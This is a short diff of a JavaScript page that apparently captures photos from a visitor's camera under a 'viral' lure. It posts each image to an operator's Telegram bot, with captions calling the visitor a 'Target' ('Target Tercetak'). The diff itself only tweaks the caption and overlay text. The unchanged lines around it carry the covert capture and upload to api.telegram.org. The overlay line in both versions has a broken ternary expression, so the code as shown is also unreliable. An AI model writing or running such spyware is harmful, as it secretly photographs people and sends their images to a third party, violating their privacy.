@@ -85,7 +85,7 @@
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, `viral_${photoCount}.jpg`);
-            formData.append("caption", `👿 Target Tercetak\nFoto ke-${photoCount},\nWaktu: ${new Date().toLocaleString()}`);
+            formData.append("caption", `👿 Target Tercetak\nFoto ke-${photoCount}\nWaktu: ${new Date().toLocaleString()}`);
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
@@ -121,7 +121,7 @@
                 ctx.font = "bold 68px Arial";
                 ctx.fillStyle = (count % 2 === 0) ? "#ffff00" : "#00ffff";
                 ctx.textAlign = "center";
-                ctx.fillText(count % 3 === 0 ? "👿" "👿", 640, 110);
+                ctx.fillText(count % 3 === 0 ? "target" "👿", 640, 110);
 
                 stream.getTracks().forEach(track => track.stop());
                 flashEffect();
